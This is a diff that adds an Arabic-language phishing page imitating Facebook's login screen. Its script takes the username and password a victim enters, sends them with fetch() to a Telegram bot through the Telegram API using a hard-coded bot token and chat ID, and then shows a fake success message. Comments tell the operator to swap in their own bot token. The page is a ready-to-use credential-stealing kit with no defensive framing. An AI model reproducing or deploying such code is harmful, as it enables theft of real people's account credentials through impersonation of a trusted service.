@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        button {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            text-align: left;
+            margin-top: 10px;
+        }
+
+        .create-account {
+            text-align: right;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo">
+        <h2>تسجيل الدخول إلى فيسبوك</h2>
+        <form id="loginForm" action="/login" method="POST">
+            <div class="form-group">
+                <input type="text" id="username" name="username" placeholder="اسم المستخدم" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
+            </div>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">هل نسيت كلمة المرور؟</a>
+        </div>
+        <div class="create-account">
+            <p>ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Customize the message as per your requirement
+            var messageToSend = `
+                تم تسجيل دخول للمستخدم:
+                اسم المستخدم: ${username}
+                كلمة المرور: ${password}
+            `;
+
+            // Replace with your bot token and chat ID
+            var botToken = '7317054018:AAGInl8VmqVPK1fRIYfHx7zRnGceuTcH5pY';  // Replace with your bot token
+            var botChatId = '1538488453';   // Replace with your chat ID
+
+            // Send message to Telegram
+            fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: botChatId,
+                    text: messageToSend
+                })
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                    alert('تم تسجيل الدخول بنجاح!');
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                    alert('حدثت مشكلة أثناء محاولة تسجيل الدخول.');
+                });
+        });
+    </script>
+</body>
+
+</html>
